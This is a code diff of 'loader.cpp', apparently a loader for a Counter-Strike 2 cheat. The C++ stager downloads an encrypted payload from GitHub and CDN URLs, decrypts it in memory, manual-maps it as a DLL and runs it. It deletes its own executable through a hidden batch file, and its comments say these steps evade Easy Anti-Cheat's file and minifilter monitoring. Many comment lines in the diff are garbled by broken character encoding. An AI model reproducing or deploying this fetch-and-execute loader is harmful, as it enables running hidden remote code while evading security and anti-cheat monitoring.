@@ -1,15 +1,15 @@
-// ============================================================
-// loader.cpp �?远程加载 Stager
+﻿// ============================================================
+// loader.cpp �?远程加载 Stager
 //
 // 架构:
 //   1. WinHTTP 从服务器下载加密 Payload
-//   2. 内存�?XTEA+CBC 解密
-//   3. 使用 ManualMapper 映射 DLL 到当前进�?
+//   2. 内存�?XTEA+CBC 解密
+//   3. 使用 ManualMapper 映射 DLL 到当前进�?
 //   4. 调用 DllMain(DLL_PROCESS_ATTACH)
-//   5. 自删�?(规避 EAC 文件扫描)
+//   5. 自删�?(规避 EAC 文件扫描)
 //
 // 磁盘上仅短暂存在 loader.exe 本身 (启动后立即自删除),
-// Payload 全程在内存中, 不落盘�?
+// Payload 全程在内存中, 不落盘�?
 // ============================================================
 
 #include <windows.h>
@@ -20,15 +20,15 @@
 #include <string>
 
 // ============================================================
-// 配置�?(部署时修�?
+// 配置�?(部署时修�?
 // ============================================================
 
-// Payload 下载地址 �?部署时替换为你的服务�?URL
-// �?CDN 备�?(国内网络可能无法直连 raw.githubusercontent.com)
+// Payload 下载地址 �?部署时替换为你的服务�?URL
+// �?CDN 备�?(国内网络可能无法直连 raw.githubusercontent.com)
 static const wchar_t* PAYLOAD_URLS[] = {
-    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/57f8532/payload.dat",
-    L"https://cdn.jsdelivr.net/gh/heruixii/cs2-remote-loader@57f8532/payload.dat",
-    L"https://cdn.statically.io/gh/heruixii/cs2-remote-loader@57f8532/payload.dat",
+    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/927f9f0/payload.dat",
+    L"https://cdn.jsdelivr.net/gh/heruixii/cs2-remote-loader@927f9f0/payload.dat",
+    L"https://cdn.statically.io/gh/heruixii/cs2-remote-loader@927f9f0/payload.dat",
 };
 static const int PAYLOAD_URL_COUNT = sizeof(PAYLOAD_URLS) / sizeof(PAYLOAD_URLS[0]);
 
@@ -36,7 +36,7 @@ static const int PAYLOAD_URL_COUNT = sizeof(PAYLOAD_URLS) / sizeof(PAYLOAD_URLS[
 static const DWORD DOWNLOAD_TIMEOUT_MS = 30000;
 
 // ============================================================
-// XTEA 解密 (�?encrypt.cpp 配套)
+// XTEA 解密 (�?encrypt.cpp 配套)
 // ============================================================
 
 static constexpr uint32_t XTEA_DELTA = 0x9E3779B9;
@@ -130,7 +130,7 @@ static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
         DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS,
         DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS);
 
-    // 发送请�?
+    // 发送请�?
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
         !WinHttpReceiveResponse(hRequest, nullptr)) {
@@ -162,7 +162,7 @@ static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
 }
 
 // ============================================================
-// 自删�?�?启动批处理延迟删除自身文�?
+// 自删�?�?启动批处理延迟删除自身文�?
 // ============================================================
 
 static void SelfDelete() {
@@ -188,7 +188,7 @@ static void SelfDelete() {
                   &written, nullptr);
         CloseHandle(hBat);
 
-        // 以隐藏窗口启�?
+        // 以隐藏窗口启�?
         wchar_t cmdLine[512];
         swprintf_s(cmdLine, L"/c \"\"%s\" \"%s\"\"", batPath, selfPath);
         ShellExecuteW(nullptr, L"open", L"cmd.exe", cmdLine, nullptr, SW_HIDE);
@@ -196,10 +196,10 @@ static void SelfDelete() {
 }
 
 // ============================================================
-// 最小化 PE 手动映射�?(不依�?stealth_lib, 独立实现)
+// 最小化 PE 手动映射�?(不依�?stealth_lib, 独立实现)
 //
-// 纯内存操�? download �?decrypt �?VirtualAlloc manual map
-// 不写磁盘 �?规避 EAC minifilter 文件系统监控
+// 纯内存操�? download �?decrypt �?VirtualAlloc manual map
+// 不写磁盘 �?规避 EAC minifilter 文件系统监控
 // VAD伪装交由 payload 端的 SelfCloaker 处理
 // ============================================================
 
@@ -211,9 +211,9 @@ struct MinimalMapResult {
 };
 
 #define SECTION_MAP_EXECUTE    0x0008
-// 全程纯内存操�? download �?decrypt �?VirtualAlloc manual map
+// 全程纯内存操�? download �?decrypt �?VirtualAlloc manual map
 // VAD伪装交由 payload 端的 SelfCloaker 处理
-// (已移�?SEC_IMAGE 磁盘路径 �?规避 EAC minifilter)
+// (已移�?SEC_IMAGE 磁盘路径 �?规避 EAC minifilter)
 
 static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize) {
     MinimalMapResult result = {};
@@ -231,7 +231,7 @@ static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize)
     DWORD imageSize = nt->OptionalHeader.SizeOfImage;
     uintptr_t preferredBase = nt->OptionalHeader.ImageBase;
 
-    // --- 2. 纯内�?VirtualAlloc (无磁盘写�? 规避 EAC minifilter) ---
+    // --- 2. 纯内�?VirtualAlloc (无磁盘写�? 规避 EAC minifilter) ---
     auto* imageBase = reinterpret_cast<uint8_t*>(
         VirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
     if (!imageBase) return result;
@@ -249,7 +249,7 @@ static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize)
         }
     }
 
-    // --- 4. 基址重定�?---
+    // --- 4. 基址重定�?---
     uintptr_t delta = reinterpret_cast<uintptr_t>(imageBase) - preferredBase;
     if (delta != 0) {
         auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -275,7 +275,7 @@ static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize)
         }
     }
 
-    // --- 5. 导入表解�?(预加载loader目录下的 pthread DLL) ---
+    // --- 5. 导入表解�?(预加载loader目录下的 pthread DLL) ---
     wchar_t loaderDir[MAX_PATH];
     GetModuleFileNameW(nullptr, loaderDir, MAX_PATH);
     wchar_t* lastSlash = wcsrchr(loaderDir, L'\\');
@@ -349,14 +349,14 @@ static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize)
 }
 
 // ============================================================
-// 主入�?(WinMain �?无控制台窗口)
+// 主入�?(WinMain �?无控制台窗口)
 // ============================================================
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     // --- 0. 启动后立即自删除 (规避 EAC 磁盘扫描) ---
     SelfDelete();
 
-    // --- 1. 下载 Payload (�?CDN 逐个尝试) ---
+    // --- 1. 下载 Payload (�?CDN 逐个尝试) ---
     std::vector<uint8_t> encryptedData;
     for (int i = 0; i < PAYLOAD_URL_COUNT; i++) {
         encryptedData = DownloadPayload(PAYLOAD_URLS[i]);
@@ -364,7 +364,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     }
 
     if (encryptedData.size() < 8) {
-        return 1; // 下载失败, 静默退�?
+        return 1; // 下载失败, 静默退�?
     }
 
     // --- 2. 解密 Payload ---
@@ -380,15 +380,15 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     // XTEA CBC 解密 (原地)
     XteaDecryptCBC(payloadBuf, encryptedPayloadSize);
 
-    // --- 3. ManualMap 到当前进�?---
+    // --- 3. ManualMap 到当前进�?---
     auto mapResult = MinimalManualMap(payloadBuf, originalSize);
     if (!mapResult.success) {
         return 3;
     }
 
     // --- 4. 调用 DllMain(DLL_PROCESS_ATTACH) ---
-    // DllMain 在当前线程上直接运行 CheatMainLoop (不创建额外线�?,
-    // 从此处开�?loader.exe 进程进入无限循环, 永不返回
+    // DllMain 在当前线程上直接运行 CheatMainLoop (不创建额外线�?,
+    // 从此处开�?loader.exe 进程进入无限循环, 永不返回
     using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
     auto dllMain = reinterpret_cast<DllMainFn>(mapResult.entryPoint);
     dllMain(reinterpret_cast<HINSTANCE>(mapResult.imageBase),
